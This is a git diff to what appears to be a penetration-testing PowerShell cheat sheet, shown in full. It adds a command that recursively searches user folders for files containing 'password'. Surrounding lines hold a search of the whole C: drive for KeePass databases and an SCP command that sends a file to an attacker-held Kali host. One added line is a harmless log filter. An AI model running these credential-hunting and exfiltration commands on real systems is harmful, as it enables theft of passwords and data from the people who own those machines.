@@ -125,6 +125,16 @@ Powershell find Keepass file:
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
+Powershell find string in files:
+```powershell
+Get-ChildItem -Path "C:\Users\" -Recurse -ErrorAction 'SilentlyContinue' | Select-String -Pattern "password" -ErrorAction 'SilentlyContinue' | Select LineNumber, Filename, Path
+```
+
+Powershell search in file for lines excluding keyword:
+```powershell
+cat NoisyLogFile.txt | Where-Object { !( $_ | Select-String "annoying string to filter" -quiet) }
+```
+
 Powershell SCP:
 ```powershell
 scp filename.txt kali@<our IP>:/home/kali
